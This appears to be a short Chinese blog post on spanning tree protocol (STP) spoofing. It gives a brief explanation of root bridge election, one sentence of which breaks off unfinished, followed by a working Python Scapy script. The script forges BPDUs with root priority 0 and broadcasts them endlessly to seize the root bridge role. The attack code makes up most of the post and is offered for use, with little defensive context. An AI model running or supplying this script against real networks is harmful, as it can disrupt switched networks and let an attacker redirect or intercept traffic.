---
title: 网络攻防之——Python实现生成树协议(STP)欺骗攻击
categories: JavaSE 复习
copyright: true
date: 2019-04-09 10:09:48
tags:
- Python
- 生成树协议欺骗
- 网络攻防
---
# 何为生成树协议欺骗攻击？
- 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来位置下游设备之间的关系
> 根桥其实

# 代码示例
<!--more-->
```
#!/usr/bin/python
from scapy.all import *

eth = Dot3(dst="01:80:c2:00:00:00", src="00:0c:29:02:03:48")

llc = LLC(dsap=0x42,ssap=0x42,ctrl=0x03)

stp = STP(rootid=0, rootmac="00:0c:29:02:03:48", bridgeid=0, bridgemac="00:0c:29:02:03:48"
)

pkt=sendp(eth/llc/stp,inter=2,loop=1)
```